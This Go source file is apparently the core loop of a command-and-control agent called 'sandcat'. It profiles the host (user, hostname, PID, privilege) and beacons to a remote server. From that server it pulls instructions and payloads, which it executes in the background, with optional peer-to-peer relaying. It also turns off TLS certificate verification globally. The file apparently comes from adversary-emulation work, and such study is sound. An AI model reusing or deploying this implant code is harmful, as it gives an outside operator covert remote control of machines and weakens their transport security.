package core

import (
	"crypto/tls"
	"fmt"
	"net/http"
	"os"
	"os/user"
	"reflect"
	"runtime"
	"strings"
	"time"
	"path/filepath"

	"../contact"
	"../execute"
	"../util"
	"../output"
	"../privdetect"
)

func runAgent(coms contact.Contact, profile map[string]interface{}) {
    watchdog := 0
	checkin := time.Now()
	for {
		beacon := coms.GetInstructions(profile)
		if len(beacon) != 0 {
			profile["paw"] = beacon["paw"]
			checkin = time.Now()
		}

		if beacon["instructions"] != nil && len(beacon["instructions"].([]interface{})) > 0 {
			cmds := reflect.ValueOf(beacon["instructions"])
			for i := 0; i < cmds.Len(); i++ {
				cmd := cmds.Index(i).Elem().String()
				command := util.Unpack([]byte(cmd))
				output.VerbosePrint(fmt.Sprintf("[*] Running instruction %s", command["id"]))
				payloads := coms.DropPayloads(profile, command["payload"].(string))
				go coms.RunInstruction(command, profile, payloads)
				util.Sleep(command["sleep"].(float64))
			}
		} else {
			if len(beacon) > 0 {
				util.Sleep(float64(beacon["sleep"].(int)))
				watchdog = beacon["watchdog"].(int)
			} else {
				util.Sleep(float64(15))
			}
			util.EvaluateWatchdog(checkin, watchdog)
		}
	}
}

func buildProfile(server string, executors []string, privilege string, c2 string) map[string]interface{} {
	host, _ := os.Hostname()
	user, _ := user.Current()

	profile := make(map[string]interface{})
	profile["server"] = server
	profile["host"] = host
	profile["username"] = user.Username
	profile["architecture"] = runtime.GOARCH
	profile["platform"] = runtime.GOOS
	profile["location"] = os.Args[0]
	profile["pid"] = os.Getpid()
	profile["ppid"] = os.Getppid()
	profile["executors"] = execute.DetermineExecutor(executors, runtime.GOOS, runtime.GOARCH)
	profile["privilege"] = privilege
	profile["exe_name"] = filepath.Base(os.Args[0])

	return profile
}

func chooseCommunicationChannel(profile map[string]interface{}, c2Config map[string]string) contact.Contact {
	coms, _ := contact.CommunicationChannels[c2Config["c2Name"]]
	if !validC2Configuration(profile, coms, c2Config) {
		output.VerbosePrint("[-] Invalid C2 Configuration! Defaulting to HTTP")
		coms, _ = contact.CommunicationChannels["HTTP"]
	}

	return coms
}

func validC2Configuration(profile map[string]interface{}, coms contact.Contact, c2Config map[string]string) bool {
	if strings.EqualFold(c2Config["c2Name"], c2Config["c2Name"]) {
		if _, valid := contact.CommunicationChannels[c2Config["c2Name"]]; valid {
			return coms.C2RequirementsMet(profile, c2Config)
		}
	}
	return false
}

func chooseP2pReceiverChannel(p2pReceiverConfig map[string]string) contact.P2pReceiver {
    receiver, _ := contact.P2pReceiverChannels[p2pReceiverConfig["p2pReceiverType"]]

    if receiver != nil && !validP2pReceiverConfiguration(receiver, p2pReceiverConfig) {
        output.VerbosePrint("[-] Invalid P2P Receiver configuration. Defaulting to no P2P")
        receiver = nil
    }

    return receiver
}

func validP2pReceiverConfiguration(receiver contact.P2pReceiver, p2pReceiverConfig map[string]string) bool {
    if receiverLoc, valid := p2pReceiverConfig["p2pReceiver"]; valid {
        if len(receiverLoc) > 0 {
            return true
        } else {
            return false
        }
    }
    return false
}

//Core is the main function as wrapped by sandcat.go
func Core(server string, delay int, executors []string, c2 map[string]string, p2pReceiverConfig map[string]string, verbose bool) {
	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
	privilege := privdetect.Privlevel()
	output.SetVerbose(verbose)
	output.VerbosePrint("Started sandcat in verbose mode.")
	output.VerbosePrint(fmt.Sprintf("server=%s", server))
	output.VerbosePrint(fmt.Sprintf("privilege=%s", privilege))
	output.VerbosePrint(fmt.Sprintf("initial delay=%d", delay))
	output.VerbosePrint(fmt.Sprintf("c2 channel=%s", c2["c2Name"]))

	p2pReceiverLoc := p2pReceiverConfig["p2pReceiver"]
	p2pReceiverType := p2pReceiverConfig["p2pReceiverType"]

	profile := buildProfile(server, executors, privilege, c2["c2Name"])
	util.Sleep(float64(delay))

	for {
		coms := chooseCommunicationChannel(profile, c2)
		if coms != nil {
		    // Set up and start p2p receiver if specified, for p2p forwarding.
		    p2pReceiver := chooseP2pReceiverChannel(p2pReceiverConfig)

		    if p2pReceiver != nil {
		        output.VerbosePrint(fmt.Sprintf("Starting p2p receiver type %s at %s", p2pReceiverType, p2pReceiverLoc))
		        go p2pReceiver.StartReceiver(profile, p2pReceiverConfig, coms)
		    }

		    // Run agent
			for { runAgent(coms, profile) }
		}
		util.Sleep(300)
	}
}
